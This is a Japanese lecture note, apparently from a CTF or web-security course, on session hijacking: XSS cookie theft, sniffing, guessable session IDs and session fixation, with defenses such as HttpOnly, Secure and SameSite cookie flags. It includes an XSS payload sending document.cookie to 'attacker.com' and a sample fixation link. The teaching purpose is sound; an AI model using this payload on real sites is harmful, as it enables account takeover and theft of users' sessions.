# セッションハイジャック

## セッションハイジャックとは

**セッションハイジャック**は、他のユーザーのセッショントークンを窃取して、そのユーザーになりすます攻撃手法です。

## 攻撃手法

### 1. XSSによるCookie窃取

lec12で学んだXSSを使います。

```html
<script>
  new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
</script>
```

XSS脆弱性を使って、管理者のCookieを窃取します。

### 2. ネットワーク盗聴

HTTP通信は平文なので、ネットワーク上で盗聴可能です。

```
GET /dashboard HTTP/1.1
Host: target.com
Cookie: session_id=abc123
```

HTTPSを使っていれば、通信は暗号化されるため盗聴できません。

### 3. セッションIDの推測

```
session_id=1
session_id=2
session_id=3
```

セッションIDが予測可能なパターン（連番、タイムスタンプ）で生成されている場合、他のユーザーのセッションを推測できます。

### 4. セッションフィクセーション

```
1. 攻撃者がセッションIDを生成: session_id=attacker_session
2. 攻撃者が被害者にリンクを送信:
   https://target.com/login?session_id=attacker_session
3. 被害者がログイン
4. 攻撃者が attacker_session でアクセス → 被害者としてログイン状態
```

## 防御方法

### 1. HttpOnly, Secure, SameSiteフラグ

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`: JavaScriptからのCookieアクセスを禁止
- `Secure`: HTTPSでのみCookieを送信
- `SameSite`: クロスサイトリクエストでCookieを送信しない

### 2. HTTPSの使用

全ての通信をHTTPSで暗号化します。

### 3. 強力なセッションID生成

```
セッションID = 十分な長さのランダムな文字列
```

### 4. セッションの無効化

- ログイン時にセッションIDを再生成
- ログアウト時にセッションを無効化

## CTFでのポイント

1. **XSSを探す**: 入力欄にスクリプトを注入
2. **Cookieを観察**: `document.cookie` でflagが取得できるか
3. **セッションIDを推測**: 連番、タイムスタンプ
4. **Botの動作を確認**: 管理者Botがページを訪問するか

## まとめ

セッションハイジャックは、ユーザーのセッションを乗っ取る攻撃手法です。

適切なCookie属性の設定と、強力なセッションID生成が重要です。
